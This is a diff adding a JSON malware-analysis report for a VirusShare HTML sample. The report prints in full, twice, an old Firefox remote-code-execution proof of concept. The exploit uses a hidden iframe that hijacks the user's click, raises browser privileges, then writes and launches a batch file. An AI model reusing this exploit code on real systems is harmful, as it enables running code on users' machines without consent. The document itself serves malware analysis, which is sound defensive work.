@@ -1,0 +1,71 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
+            "output": "May write to a file",
+            "put": "May write to a file",
+            "run": "May run an executable file or a system command",
+            "system": "May run an executable file or a system command on a Mac",
+            "write": "May write to a file"
+        },
+        "macro": "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\">\n\n<html>\n<head>\n<title>Firefox Full Remote Compromise</title>\n</head>\n\n<body>\nClick anywhere inside this page to compromise your system!<br>\nDon't worry. Only a harmless batch file will be run. View the source if you dont believe me ;)<br>\nLike I said in my Internet Explorer Auto-SP2 RC analysis, nothing is perfect. Breaking something, or if you're the hacker, building something, only requires patience and a little bit of spare time.<br> <br>\nGreetz to Mikx, Michael Evanchik, and the entire Mozilla team. This is a very nice browser you guys have put together!\n<iframe onload=\"loader()\" src=\"javascript:'<noscript>'+eval('if (window.name!=\\'stealcookies\\'){window.name=\\'stealcookies\\';}  else{ event={target:{href:\\'http://ftp.mozilla.org/pub/mozilla.org/extensions/flashgot/flashgot-0.5.9.1-fx+mz+tb.xpi\\'}};install(event,\\'You are vulnerable!!!\\',\\'javascript:eval(\\\\\\'netscape.security.PrivilegeManager.enablePrivilege(\\\\\\\\\\\\\\'UniversalXPConnect\\\\\\\\\\\\\\');file=Components.classes[\\\\\\\\\\\\\\'@mozilla.org/file/local;1\\\\\\\\\\\\\\'].createInstance(Components.interfaces.nsILocalFile);file.initWithPath(\\\\\\\\\\\\\\'c:\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\booom.bat\\\\\\\\\\\\\\');file.createUnique(Components.interfaces.nsIFile.NORMAL_FILE_TYPE,420);outputStream=Components.classes[\\\\\\\\\\\\\\'@mozilla.org/network/file-output-stream;1\\\\\\\\\\\\\\'].createInstance(Components.interfaces.nsIFileOutputStream);outputStream.init(file,0x04|0x08|0x20,420,0);output=\\\\\\\\\\\\\\'@ECHO off\\\\\\\\\\\\\\\\ncls\\\\\\\\\\\\\\\\nECHO If I wasnt so nice, this could have been a virus...\\\\\\\\\\\\\\\\nPAUSE\\\\\\\\\\\\\\';outputStream.write(output,output.length);outputStream.close();file.launch();\\\\\\')\\'); }')+'</noscript><a href=\\'https://addons.update.mozilla.org/extensions/moreinfo.php?id=220&application=firefox\\' style=\\'cursor:default;\\'>&nbsp;&nbsp;&nbsp;</'+'a>'\" id=\"targetframe\" scrolling=\"no\" frameborder=\"0\" marginwidth=\"0\" marginheight=0\" style=\"position:absolute; left:0px; width:0px; height:6px; width:6px; margin:0px; padding:0px; -moz-opacity:0\"></iframe>\n\n\n<script language=\"JavaScript\" type=\"text/javascript\">\n\ndocument.onmousemove = function trackMouse(e) {\n    document.getElementById(\"targetframe\").style.left = (e.pageX-3)+\"px\"\n    document.getElementById(\"targetframe\").style.top = (e.pageY-3)+\"px\"\n}   \n\nvar counter = 0;    \nfunction loader() {\n    counter++\n    if(counter == 1) {\n        stealcookies.focus()\n    } else if(counter == 2) {\n        stealcookies.history.go(-1)\n        //targetframe.style.display=\"none\";\n    }\n}\n\n\n</script>\n\n</body>\n\n</html>"
+    },
+    "filename": "VirusShare_39d0264d8c083ca0391f7bf1ef235d9e",
+    "filesize": 2598,
+    "filetype": "HTML document, ASCII text, with very long lines, with CRLF line terminators",
+    "hashes": {
+        "md5": "39d0264d8c083ca0391f7bf1ef235d9e",
+        "sha1": "2b109a355dcc58a6a3c795eee9d1c6dcf3306caa",
+        "sha256": "77a967450039870e63395495499f6c6780f2b6716c6097604f6f305ff67d58c9"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\">",
+            "<html>",
+            "<head>",
+            "<title>Firefox Full Remote Compromise</title>",
+            "</head>",
+            "<body>",
+            "Click anywhere inside this page to compromise your system!<br>",
+            "Don't worry. Only a harmless batch file will be run. View the source if you dont believe me ;)<br>",
+            "Like I said in my Internet Explorer Auto-SP2 RC analysis, nothing is perfect. Breaking something, or if you're the hacker, building something, only requires patience and a little bit of spare time.<br> <br>",
+            "Greetz to Mikx, Michael Evanchik, and the entire Mozilla team. This is a very nice browser you guys have put together!",
+            "<iframe onload=\"loader()\" src=\"javascript:'<noscript>'+eval('if (window.name!=\\'stealcookies\\'){window.name=\\'stealcookies\\';}  else{ event={target:{href:\\'http://ftp.mozilla.org/pub/mozilla.org/extensions/flashgot/flashgot-0.5.9.1-fx+mz+tb.xpi\\'}};install(event,\\'You are vulnerable!!!\\',\\'javascript:eval(\\\\\\'netscape.security.PrivilegeManager.enablePrivilege(\\\\\\\\\\\\\\'UniversalXPConnect\\\\\\\\\\\\\\');file=Components.classes[\\\\\\\\\\\\\\'@mozilla.org/file/local;1\\\\\\\\\\\\\\'].createInstance(Components.interfaces.nsILocalFile);file.initWithPath(\\\\\\\\\\\\\\'c:\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\booom.bat\\\\\\\\\\\\\\');file.createUnique(Components.interfaces.nsIFile.NORMAL_FILE_TYPE,420);outputStream=Components.classes[\\\\\\\\\\\\\\'@mozilla.org/network/file-output-stream;1\\\\\\\\\\\\\\'].createInstance(Components.interfaces.nsIFileOutputStream);outputStream.init(file,0x04|0x08|0x20,420,0);output=\\\\\\\\\\\\\\'@ECHO off\\\\\\\\\\\\\\\\ncls\\\\\\\\\\\\\\\\nECHO If I wasnt so nice, this could have been a virus...\\\\\\\\\\\\\\\\nPAUSE\\\\\\\\\\\\\\';outputStream.write(output,output.length);outputStream.close();file.launch();\\\\\\')\\'); }')+'</noscript><a href=\\'https://addons.update.mozilla.org/extensions/moreinfo.php?id=220&application=firefox\\' style=\\'cursor:default;\\'>&nbsp;&nbsp;&nbsp;</'+'a>'\" id=\"targetframe\" scrolling=\"no\" frameborder=\"0\" marginwidth=\"0\" marginheight=0\" style=\"position:absolute; left:0px; width:0px; height:6px; width:6px; margin:0px; padding:0px; -moz-opacity:0\"></iframe>",
+            "<script language=\"JavaScript\" type=\"text/javascript\">",
+            "document.onmousemove = function trackMouse(e) {",
+            "    document.getElementById(\"targetframe\").style.left = (e.pageX-3)+\"px\"",
+            "    document.getElementById(\"targetframe\").style.top = (e.pageY-3)+\"px\"",
+            "}   ",
+            "var counter = 0;    ",
+            "function loader() {",
+            "    counter++",
+            "    if(counter == 1) {",
+            "        stealcookies.focus()",
+            "    } else if(counter == 2) {",
+            "        stealcookies.history.go(-1)",
+            "        //targetframe.style.display=\"none\";",
+            "    }",
+            "</script>",
+            "</body>",
+            "</html>"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [
+            "0.5.9.1"
+        ],
+        "url": [
+            "http://ftp.mozilla.org/pub/mozilla.org/extensions/flashgot/flashgot-0.5.9.1-fx+mz+tb.xpi\\",
+            "https://addons.update.mozilla.org/extensions/moreinfo.php?id=220&application=firefox\\"
+        ]
+    },
+    "time": "0:00:00.298968",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
